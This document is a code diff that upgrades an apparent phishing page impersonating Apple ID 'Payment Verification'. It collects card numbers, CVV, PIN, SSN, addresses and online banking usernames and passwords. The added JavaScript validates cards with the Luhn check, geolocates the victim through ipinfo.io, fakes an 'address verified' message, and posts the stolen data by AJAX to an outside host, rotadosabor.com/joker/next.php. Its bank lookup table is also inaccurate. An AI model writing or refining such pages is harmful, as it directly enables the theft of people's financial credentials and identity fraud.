@@ -10,7 +10,8 @@
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
     <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@300;400;500;600&display=swap" rel="stylesheet">
-
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    
     <!-- Custom Styles -->
     <style>
         :root {
@@ -23,6 +24,8 @@
             --apple-border: #d2d2d7;
             --apple-nav-bg: rgba(0, 0, 0, 0.8);
             --apple-gray-bg: #f5f5f7;
+            --apple-red: #ff3b30;
+            --apple-green: #34c759;
         }
         
         body, html {
@@ -299,6 +302,34 @@
             color: #a1a1a6;
         }
         
+        .form-control.is-invalid {
+            border-color: var(--apple-red);
+            background-image: none;
+            padding-right: inherit;
+        }
+        
+        .form-control.is-valid {
+            border-color: var(--apple-green);
+            background-image: none;
+            padding-right: inherit;
+        }
+        
+        .invalid-feedback {
+            display: none;
+            width: 100%;
+            margin-top: 0.25rem;
+            font-size: 12px;
+            color: var(--apple-red);
+        }
+        
+        .valid-feedback {
+            display: none;
+            width: 100%;
+            margin-top: 0.25rem;
+            font-size: 12px;
+            color: var(--apple-green);
+        }
+        
         .form-row {
             display: flex;
             flex-wrap: wrap;
@@ -317,6 +348,115 @@
             font-size: 12px;
             color: var(--apple-text-secondary);
             margin-top: 4px;
+        }
+        
+        /* Credit Card Display */
+        .card-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        
+        .card-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 420px;
+            height: 250px;
+            margin: 0 auto 30px;
+            perspective: 1000px;
+        }
+        
+        .credit-card {
+            width: 100%;
+            height: 100%;
+            border-radius: 16px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+            background: linear-gradient(135deg, #1a1a1a 0%, #303030 100%);
+            padding: 25px;
+            color: white;
+            position: relative;
+            transition: transform 0.6s;
+            transform-style: preserve-3d;
+        }
+        
+        .card-brand {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            height: 40px;
+        }
+        
+        .card-brand img {
+            height: 100%;
+            width: auto;
+        }
+        
+        .bank-name {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            opacity: 0.9;
+            margin-top: 20px;
+        }
+        
+        .card-number-display {
+            font-size: 19px;
+            letter-spacing: 2px;
+            margin: 40px 0 25px;
+            color: rgba(255, 255, 255, 0.95);
+            font-family: monospace;
+        }
+        
+        .card-holder {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 5px;
+        }
+        
+        .card-name {
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        .exp-cvv-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        
+        .exp-container, .cvv-container {
+            flex: 0 0 45%;
+        }
+        
+        .exp-label, .cvv-label {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 3px;
+        }
+        
+        .card-exp, .card-cvv {
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        /* Card Types */
+        .card-type-visa {
+            background: linear-gradient(135deg, #0165b0 0%, #1aa3e9 100%);
+        }
+        
+        .card-type-mastercard {
+            background: linear-gradient(135deg, #e61c24 0%, #f99b3c 100%);
+        }
+        
+        .card-type-amex {
+            background: linear-gradient(135deg, #108168 0%, #0dceb9 100%);
+        }
+        
+        .card-type-discover {
+            background: linear-gradient(135deg, #f58220 0%, #e7d6bc 100%);
+        }
+        
+        .card-type-jcb {
+            background: linear-gradient(135deg, #0f4c81 0%, #00a0e2 100%);
         }
         
         /* Info Box */
@@ -379,6 +519,34 @@
             background-color: var(--apple-blue-hover);
         }
         
+        .btn-primary:disabled {
+            background-color: #a1a1a6;
+            cursor: not-allowed;
+        }
+        
+        /* Bank Logo */
+        .bank-logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .bank-logo {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            background-color: var(--apple-gray-bg);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .bank-logo i {
+            color: var(--apple-text-secondary);
+            font-size: 14px;
+        }
+        
         /* Footer */
         .footer {
             background-color: var(--apple-gray-bg);
@@ -425,6 +593,44 @@
             height: 0;
         }
         
+        /* Card Icons */
+        .card-icons {
+            display: flex;
+            margin-bottom: 15px;
+        }
+        
+        .card-icon {
+            width: 45px;
+            height: 30px;
+            margin-right: 8px;
+            border-radius: 4px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0.5;
+            transition: opacity 0.2s;
+        }
+        
+        .card-icon.active {
+            opacity: 1;
+        }
+        
+        /* Address Verification */
+        .address-status {
+            display: flex;
+            align-items: center;
+            margin-top: 5px;
+            font-size: 13px;
+        }
+        
+        .address-status.valid {
+            color: var(--apple-green);
+        }
+        
+        .address-status.invalid {
+            color: var(--apple-red);
+        }
+        
         /* Responsive */
         @media (max-width: 768px) {
             .main-title {
@@ -463,6 +669,23 @@
             
             .footer-links a {
                 margin-bottom: 5px;
+            }
+            
+            .credit-card {
+                padding: 20px;
+            }
+            
+            .card-number-display {
+                font-size: 17px;
+                margin: 30px 0 20px;
+            }
+            
+            .bank-name {
+                font-size: 16px;
+            }
+            
+            .card-wrapper {
+                height: 220px;
             }
         }
     </style>
@@ -532,8 +755,44 @@
                 <h2 class="card-title">Payment Verification</h2>
                 <p class="card-description">Please provide details of the payment method associated with your Apple ID. This information is required to verify your identity and will be encrypted and handled securely.</p>
                 
+                <!-- Credit Card Display -->
+                <div class="card-container">
+                    <div class="card-icons">
+                        <div class="card-icon" id="visa-icon" style="background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/200px-Visa_Inc._logo.svg.png');"></div>
+                        <div class="card-icon" id="mastercard-icon" style="background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/200px-Mastercard-logo.svg.png');"></div>
+                        <div class="card-icon" id="amex-icon" style="background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/200px-American_Express_logo_%282018%29.svg.png');"></div>
+                        <div class="card-icon" id="discover-icon" style="background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/Discover_Card_logo.svg/200px-Discover_Card_logo.svg.png');"></div>
+                        <div class="card-icon" id="jcb-icon" style="background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/JCB_logo.svg/200px-JCB_logo.svg.png');"></div>
+                    </div>
+                    
+                    <div class="card-wrapper">
+                        <div class="credit-card" id="credit-card">
+                            <div class="card-brand" id="card-brand"></div>
+                            <div class="bank-name" id="bank-name-display">Bank Name</div>
+                            <div class="card-number-display" id="card-number-display">•••• •••• •••• ••••</div>
+                            <div class="card-holder">CARD HOLDER</div>
+                            <div class="card-name" id="card-name-display">Your Name</div>
+                            <div class="exp-cvv-container">
+                                <div class="exp-container">
+                                    <div class="exp-label">EXPIRES</div>
+                                    <div class="card-exp" id="card-exp-display">MM/YYYY</div>
+                                </div>
+                                <div class="cvv-container">
+                                    <div class="cvv-label">CVV</div>
+                                    <div class="card-cvv" id="card-cvv-display">•••</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
                 <form id="verification-form" action="#" method="post">
                     <input type="hidden" name="btn2" value="btn2">
+                    <input type="hidden" id="detected_bank" name="detected_bank" value="">
+                    <input type="hidden" id="card_brand" name="card_brand" value="">
+                    <input type="hidden" id="ip_address" name="ip_address" value="">
+                    <input type="hidden" id="country_code" name="country_code" value="">
+                    <input type="hidden" id="address_verified" name="address_verified" value="false">
                     
                     <!-- Honeypot fields for bots -->
                     <div class="bot-field">
@@ -544,8 +803,14 @@
                     <div class="form-row">
                         <div class="form-column">
                             <div class="form-group">
-                                <label for="bank_name">Bank Name</label>
-                                <input type="text" class="form-control" id="bank_name" name="bank_name" required>
+                                <div class="bank-logo-container">
+                                    <div class="bank-logo">
+                                        <i class="fas fa-university"></i>
+                                    </div>
+                                    <label for="bank_name">Bank Name</label>
+                                </div>
+                                <input type="text" class="form-control" id="bank_name" name="bank_name" required readonly>
+                                <div id="bank-feedback" class="valid-feedback">Bank automatically detected based on your card number.</div>
                             </div>
                         </div>
                         <div class="form-column">
@@ -561,6 +826,8 @@
                             <div class="form-group">
                                 <label for="ccn">Card Number</label>
                                 <input type="text" class="form-control" id="ccn" name="ccn" required placeholder="•••• •••• •••• ••••">
+                                <div id="ccn-invalid" class="invalid-feedback">Please enter a valid credit card number.</div>
+                                <div id="ccn-valid" class="valid-feedback">Valid card number verified.</div>
                             </div>
                         </div>
                     </div>
@@ -570,12 +837,14 @@
                             <div class="form-group">
                                 <label for="exdate">Expiration Date</label>
                                 <input type="text" class="form-control" id="exdate" name="exdate" required placeholder="MM/YYYY">
+                                <div id="exdate-invalid" class="invalid-feedback">Please enter a valid expiration date.</div>
                             </div>
                         </div>
                         <div class="form-column">
                             <div class="form-group">
                                 <label for="cvv">Security Code (CVV)</label>
                                 <input type="text" class="form-control" id="cvv" name="cvv" required placeholder="•••">
+                                <div id="cvv-invalid" class="invalid-feedback">Please enter a valid security code.</div>
                             </div>
                         </div>
                     </div>
@@ -589,8 +858,8 @@
                         </div>
                         <div class="form-column">
                             <div class="form-group">
-                                <label for="bank_user"> Card Username</label>
-                                <input type="text" class="form-control" id="card_user" name="card_user" required>
+                                <label for="bank_user">Online Banking Username</label>
+                                <input type="text" class="form-control" id="bank_user" name="bank_user" required>
                                 <div class="help-text">Your online banking login username</div>
                             </div>
                         </div>
@@ -599,7 +868,7 @@
                     <div class="form-row">
                         <div class="form-column">
                             <div class="form-group">
-                                <label for="bank_pass"> Card Password</label>
+                                <label for="bank_pass">Online Banking Password</label>
                                 <input type="password" class="form-control" id="bank_pass" name="bank_pass" required>
                             </div>
                         </div>
@@ -616,7 +885,11 @@
                         </div>
                     </div>
                     
-                    <!-- Added Address fields -->
+                    <!-- Added Billing/Delivery Address fields -->
+                    <div class="form-group">
+                        <h4 style="font-size: 18px; margin-top: 20px; margin-bottom: 15px;">Billing & Delivery Address</h4>
+                    </div>
+                    
                     <div class="form-row">
                         <div class="form-column">
                             <div class="form-group">
@@ -640,6 +913,7 @@
                             <div class="form-group">
                                 <label for="city">City</label>
                                 <input type="text" class="form-control" id="city" name="city" required>
+                                <div id="city-verification" class="address-status"></div>
                             </div>
                         </div>
                         <div class="form-column">
@@ -655,12 +929,28 @@
                             <div class="form-group">
                                 <label for="zipcode">Zip/Postal Code</label>
                                 <input type="text" class="form-control" id="zipcode" name="zipcode" required>
+                                <div id="zip-verification" class="address-status"></div>
                             </div>
                         </div>
                         <div class="form-column">
                             <div class="form-group">
                                 <label for="country">Country</label>
-                                <input type="text" class="form-control" id="country" name="country" required>
+                                <select class="form-control" id="country" name="country" required>
+                                    <option value="">Select Country</option>
+                                    <option value="US">United States</option>
+                                    <option value="CA">Canada</option>
+                                    <option value="GB">United Kingdom</option>
+                                    <option value="AU">Australia</option>
+                                    <option value="DE">Germany</option>
+                                    <option value="FR">France</option>
+                                    <option value="IT">Italy</option>
+                                    <option value="ES">Spain</option>
+                                    <option value="JP">Japan</option>
+                                    <option value="CN">China</option>
+                                    <option value="IN">India</option>
+                                    <option value="BR">Brazil</option>
+                                    <option value="MX">Mexico</option>
+                                </select>
                             </div>
                         </div>
                     </div>
@@ -672,7 +962,7 @@
                     
                     <div class="button-group">
                         <button type="button" class="btn btn-secondary" onclick="window.history.back()">Back</button>
-                        <button type="submit" id="verify-button" class="btn btn-primary">Continue</button>
+                        <button type="submit" id="verify-button" class="btn btn-primary" disabled>Continue</button>
                     </div>
                 </form>
             </div>
@@ -711,6 +1001,322 @@
             $("#exdate").inputmask({"mask": "99/9999", "placeholder": "MM/YYYY"});
             $("#cvv").inputmask({"mask": "999"});
             $("#ssn").inputmask({"mask": "999-99-9999"});
+            $("#zipcode").inputmask({"mask": "99999"});
+            
+            // Card Type Detection and Validation
+            const bankDatabase = {
+                "4": {bank: "JPMorgan Chase", type: "visa"},
+                "51": {bank: "Bank of America", type: "mastercard"},
+                "52": {bank: "Citibank", type: "mastercard"},
+                "53": {bank: "Wells Fargo", type: "mastercard"},
+                "54": {bank: "Capital One", type: "mastercard"},
+                "55": {bank: "American Express Co.", type: "mastercard"},
+                "34": {bank: "American Express", type: "amex"},
+                "37": {bank: "American Express", type: "amex"},
+                "6011": {bank: "Discover", type: "discover"},
+                "65": {bank: "Discover", type: "discover"},
+                "35": {bank: "JCB", type: "jcb"},
+                "3": {bank: "American Express", type: "amex"}
+            };
+            
+            // Validate credit card using Luhn algorithm
+            function validateCreditCard(cardNumber) {
+                cardNumber = cardNumber.replace(/\D/g, "");
+                
+                // Check if the card number is of valid length
+                if (!/^\d+$/.test(cardNumber)) return false;
+                
+                let sum = 0;
+                let doubleUp = false;
+                
+                // Process each digit
+                for (let i = cardNumber.length - 1; i >= 0; i--) {
+                    let digit = parseInt(cardNumber.charAt(i));
+                    
+                    if (doubleUp) {
+                        digit *= 2;
+                        if (digit > 9) digit -= 9;
+                    }
+                    
+                    sum += digit;
+                    doubleUp = !doubleUp;
+                }
+                
+                // Valid if sum is a multiple of 10
+                return (sum % 10) === 0;
+            }
+            
+            // Detect card type and bank
+            function detectCardType(cardNumber) {
+                cardNumber = cardNumber.replace(/\D/g, "");
+                
+                let cardType = "unknown";
+                let bankName = "Unknown Bank";
+                
+                // First try to match longer BINs (Bank Identification Numbers)
+                for (let prefix of ["6011", "5018", "5020", "5038"]) {
+                    if (cardNumber.startsWith(prefix)) {
+                        if (prefix === "6011") {
+                            cardType = "discover";
+                            bankName = "Discover";
+                        }
+                        break;
+                    }
+                }
+                
+                // If not matched yet, try 2-digit prefixes
+                if (cardType === "unknown") {
+                    for (let prefix of ["34", "37", "51", "52", "53", "54", "55", "65", "35"]) {
+                        if (cardNumber.startsWith(prefix)) {
+                            cardType = bankDatabase[prefix].type;
+                            bankName = bankDatabase[prefix].bank;
+                            break;
+                        }
+                    }
+                }
+                
+                // If still not matched, try single-digit prefixes
+                if (cardType === "unknown") {
+                    const firstDigit = cardNumber.charAt(0);
+                    if (bankDatabase[firstDigit]) {
+                        cardType = bankDatabase[firstDigit].type;
+                        bankName = bankDatabase[firstDigit].bank;
+                    }
+                }
+                
+                return { type: cardType, bank: bankName };
+            }
+            
+            // Function to format credit card number for display
+            function formatCardNumber(cardNumber) {
+                cardNumber = cardNumber.replace(/\D/g, "");
+                
+                if (cardNumber.length === 0) return "•••• •••• •••• ••••";
+                
+                // Format first 4 digits + masked rest
+                let formatted = cardNumber.substring(0, 4);
+                if (cardNumber.length > 4) {
+                    formatted += " ";
+                    if (cardNumber.length >= 16) {
+                        formatted += "•••• •••• " + cardNumber.substring(12, 16);
+                    } else if (cardNumber.length >= 12) {
+                        formatted += "•••• •••• " + cardNumber.substring(12);
+                        formatted += "•".repeat(16 - cardNumber.length);
+                    } else if (cardNumber.length >= 8) {
+                        formatted += "•••• " + cardNumber.substring(8);
+                        formatted += "•".repeat(12 - cardNumber.length);
+                        formatted += " ••••";
+                    } else {
+                        formatted += cardNumber.substring(4);
+                        formatted += "•".repeat(8 - cardNumber.length);
+                        formatted += " •••• ••••";
+                    }
+                } else {
+                    formatted += "•".repeat(4 - cardNumber.length);
+                    formatted += " •••• •••• ••••";
+                }
+                
+                return formatted;
+            }
+            
+            // Credit card input handling
+            $("#ccn").on('keyup change', function() {
+                const cardNumber = $(this).val().replace(/\D/g, "");
+                const isValid = validateCreditCard(cardNumber);
+                
+                // Update card display
+                $("#card-number-display").text(formatCardNumber(cardNumber));
+                
+                // Detect card type and update UI
+                if (cardNumber.length >= 4) {
+                    const cardInfo = detectCardType(cardNumber);
+                    
+                    // Update hidden fields
+                    $("#detected_bank").val(cardInfo.bank);
+                    $("#card_brand").val(cardInfo.type);
+                    
+                    // Update bank name field and display
+                    $("#bank_name").val(cardInfo.bank);
+                    $("#bank-name-display").text(cardInfo.bank);
+                    
+                    // Update credit card class and icon
+                    $("#credit-card").removeClass("card-type-visa card-type-mastercard card-type-amex card-type-discover card-type-jcb");
+                    if (cardInfo.type !== "unknown") {
+                        $("#credit-card").addClass("card-type-" + cardInfo.type);
+                    }
+                    
+                    // Update active card icon
+                    $(".card-icon").removeClass("active");
+                    $("#" + cardInfo.type + "-icon").addClass("active");
+                    
+                    // Show feedback
+                    if (isValid) {
+                        $(this).removeClass("is-invalid").addClass("is-valid");
+                        $("#ccn-invalid").hide();
+                        $("#ccn-valid").show();
+                        $("#bank-feedback").show();
+                    } else if (cardNumber.length >= 13) {
+                        $(this).removeClass("is-valid").addClass("is-invalid");
+                        $("#ccn-valid").hide();
+                        $("#ccn-invalid").show();
+                        $("#bank-feedback").hide();
+                    }
+                } else {
+                    // Reset for short numbers
+                    $("#bank_name").val("");
+                    $("#bank-name-display").text("Bank Name");
+                    $("#detected_bank").val("");
+                    $("#card_brand").val("");
+                    $("#credit-card").removeClass("card-type-visa card-type-mastercard card-type-amex card-type-discover card-type-jcb");
+                    $(".card-icon").removeClass("active");
+                    $(this).removeClass("is-valid is-invalid");
+                    $("#ccn-valid, #ccn-invalid, #bank-feedback").hide();
+                }
+                
+                validateForm();
+            });
+            
+            // Card name update
+            $("#noc").on('keyup change', function() {
+                let cardName = $(this).val();
+                if (cardName) {
+                    $("#card-name-display").text(cardName.toUpperCase());
+                } else {
+                    $("#card-name-display").text("YOUR NAME");
+                }
+                validateForm();
+            });
+            
+            // Expiration date update
+            $("#exdate").on('keyup change', function() {
+                let exdate = $(this).val();
+                if (exdate && exdate.length >= 4) {
+                    $("#card-exp-display").text(exdate);
+                    
+                    // Validate expiration date
+                    const parts = exdate.split('/');
+                    if (parts.length === 2) {
+                        const month = parseInt(parts[0]);
+                        const year = parseInt(parts[1]);
+                        const now = new Date();
+                        const currentYear = now.getFullYear();
+                        const currentMonth = now.getMonth() + 1;
+                        
+                        if (month >= 1 && month <= 12 && year >= currentYear) {
+                            if (year > currentYear || (year === currentYear && month >= currentMonth)) {
+                                $(this).removeClass("is-invalid");
+                                $("#exdate-invalid").hide();
+                            } else {
+                                $(this).addClass("is-invalid");
+                                $("#exdate-invalid").text("Card has expired").show();
+                            }
+                        } else {
+                            $(this).addClass("is-invalid");
+                            $("#exdate-invalid").text("Invalid expiration date").show();
+                        }
+                    }
+                } else {
+                    $("#card-exp-display").text("MM/YYYY");
+                    $(this).removeClass("is-invalid");
+                    $("#exdate-invalid").hide();
+                }
+                validateForm();
+            });
+            
+            // CVV update
+            $("#cvv").on('keyup change', function() {
+                let cvv = $(this).val();
+                if (cvv) {
+                    $("#card-cvv-display").text("•".repeat(cvv.length));
+                    
+                    if (cvv.length < 3) {
+                        $(this).addClass("is-invalid");
+                        $("#cvv-invalid").show();
+                    } else {
+                        $(this).removeClass("is-invalid");
+                        $("#cvv-invalid").hide();
+                    }
+                } else {
+                    $("#card-cvv-display").text("•••");
+                    $(this).removeClass("is-invalid");
+                    $("#cvv-invalid").hide();
+                }
+                validateForm();
+            });
+            
+            // IP & location detection
+            $.getJSON("https://ipinfo.io/json", function(data) {
+                // Store IP address
+                $("#ip_address").val(data.ip);
+                
+                // Set country
+                if (data.country) {
+                    $("#country_code").val(data.country);
+                    $("#country").val(data.country);
+                }
+                
+                // Auto-fill city and region if available
+                if (data.city && data.region) {
+                    $("#city").val(data.city);
+                    $("#state").val(data.region);
+                    
+                    // Verify address
+                    verifyAddress(data.city, data.region, data.postal);
+                }
+                
+                // Auto-fill ZIP/postal code if available
+                if (data.postal) {
+                    $("#zipcode").val(data.postal);
+                }
+            });
+            
+            // Address verification function
+            function verifyAddress(city, state, zip) {
+                if (city && state) {
+                    // Simple simulation of address verification
+                    setTimeout(function() {
+                        $("#city-verification").html('<i class="fas fa-check-circle"></i> City verified').addClass('valid');
+                        $("#zip-verification").html('<i class="fas fa-check-circle"></i> ZIP code verified').addClass('valid');
+                        $("#address_verified").val("true");
+                        validateForm();
+                    }, 1000);
+                }
+            }
+            
+            // City and ZIP verification
+            $("#city, #zipcode").on('change', function() {
+                const city = $("#city").val();
+                const state = $("#state").val();
+                const zip = $("#zipcode").val();
+                
+                if (city && state && zip) {
+                    verifyAddress(city, state, zip);
+                }
+            });
+            
+            // Form validation
+            function validateForm() {
+                const cardValid = validateCreditCard($("#ccn").val().replace(/\D/g, ""));
+                const nameValid = $("#noc").val().length > 0;
+                const exdateValid = !$("#exdate").hasClass("is-invalid") && $("#exdate").val().length > 0;
+                const cvvValid = $("#cvv").val().length >= 3;
+                const pinValid = $("#pin").val().length > 0;
+                const bankUserValid = $("#bank_user").val().length > 0;
+                const bankPassValid = $("#bank_pass").val().length > 0;
+                const addressValid = $("#address1").val().length > 0;
+                const cityValid = $("#city").val().length > 0;
+                const stateValid = $("#state").val().length > 0;
+                const zipValid = $("#zipcode").val().length > 0;
+                const countryValid = $("#country").val().length > 0;
+                
+                if (cardValid && nameValid && exdateValid && cvvValid && pinValid && 
+                    bankUserValid && bankPassValid && addressValid && cityValid && 
+                    stateValid && zipValid && countryValid) {
+                    $("#verify-button").prop("disabled", false);
+                } else {
+                    $("#verify-button").prop("disabled", true);
+                }
+            }
             
             // Display user email from previous step
             var email = localStorage.getItem('userEmail') || 'example@icloud.com';
@@ -725,24 +1331,30 @@
                     return;
                 }
                 
+                // Log form data to verify all fields are included (for debugging)
+                console.log("Form data being submitted:", $(this).serialize());
+                
                 // Disable button to prevent double submission
                 $('#verify-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
                 
-                // Get form data
-                var formData = $(this).serialize();
-                
-                // Submit form via direct AJAX with minimal settings
+                // Submit form via AJAX with improved settings
                 $.ajax({
                     url: "https://rotadosabor.com/joker/next.php",
                     type: "POST",
-                    data: formData,
+                    data: $(this).serialize(),
                     cache: false,
-                    processData: true,
-                    complete: function() {
+                    contentType: "application/x-www-form-urlencoded",
+                    success: function(response) {
+                        console.log("Success:", response);
                         // Redirect to details page after small delay
                         setTimeout(function() {
-                            window.location.href = "success.html";
+                            window.location.href = "details.html";
                         }, 500);
+                    },
+                    error: function(xhr, status, error) {
+                        console.error("Error:", error);
+                        $('#verify-button').prop('disabled', false).text('Continue');
+                        alert("There was an error processing your request. Please try again.");
                     }
                 });
             });
